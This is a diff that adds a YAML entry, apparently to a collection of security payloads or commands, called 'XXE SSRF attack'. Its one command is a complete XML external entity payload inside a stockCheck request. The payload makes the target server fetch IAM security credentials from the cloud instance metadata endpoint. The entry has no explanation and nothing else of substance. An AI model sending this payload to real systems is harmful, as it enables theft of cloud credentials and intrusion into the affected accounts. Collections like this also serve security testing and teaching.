@@ -1,0 +1,19 @@
+name: XXE SSRF attack
+description: SSRF attack over XXE
+commands:
+  - command: |
+      <?xml version="1.0" encoding="UTF-8"?>
+      <!DOCTYPE productId 
+      [<!ENTITY ssrf SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin" > ]>
+      <stockCheck>
+          <productId>&ssrf;</productId>
+          <storeId>1</storeId>
+      </stockCheck>
+tags:
+  - xxe
+  - ssrf
+show:
+links:
+  -
+references:
+  -
